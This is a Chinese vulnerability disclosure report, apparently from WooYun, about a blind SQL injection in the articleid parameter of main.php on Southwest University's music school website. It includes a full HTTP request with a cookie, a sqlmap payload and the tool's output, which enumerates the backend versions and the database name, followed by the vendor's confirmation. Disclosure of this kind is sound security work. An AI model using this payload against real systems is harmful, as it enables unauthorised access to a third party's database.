wybug_detail:
漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-16：	厂商已经确认，细节仅向厂商公开									2015-12-26：	细节向核心白帽子及相关领域专家公开									2016-01-05：	细节向普通白帽子公开									2016-01-15：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 如题 详细说明：  西南大学音乐学院存在SQL注入，注入点详细如下地址
music.swu.edu.cn
注入点存在于main.php,
/main.php?articleid=95&op=english
需要加入cookie才能进行注入测试，
GET /main.php?articleid=95&op=english HTTP/1.1Host: music.swu.edu.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: nS_wcI_5f=3y/WwX7arWzQoLXGytgXtUWBO8UBZPj0nHdiBA==Connection: keep-alive
用sqlmap进行测试，mysql小于5，表只能用来爆破……   漏洞证明：  漏洞证明
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: articleid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: articleid=95 AND 2095=2095&op=english---[11:09:38] [INFO] the back-end DBMS is MySQLweb application technology: PHP 4.3.11, Apache 1.3.33back-end DBMS: MySQL 3[11:09:38] [INFO] testing if current user is DBA[11:09:38] [INFO] fetching current user[11:09:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:09:38] [INFO] retrieved: [11:09:38] [INFO] heuristics detected web page charset 'ascii'[11:09:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'current user is DBA:    False[11:09:40] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database[11:09:40] [INFO] fetching number of databases[11:09:40] [INFO] retrieved: [11:09:41] [ERROR] unable to retrieve the number of databases[11:09:41] [INFO] falling back to current database[11:09:41] [INFO] fetching current database[11:09:41] [INFO] retrieved: musicavailable databases [1]:[*] music
   修复方案：  过滤防护   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-16 09:52 厂商回复： 已经转给相关单位，谢谢！ 最新状态： 暂无
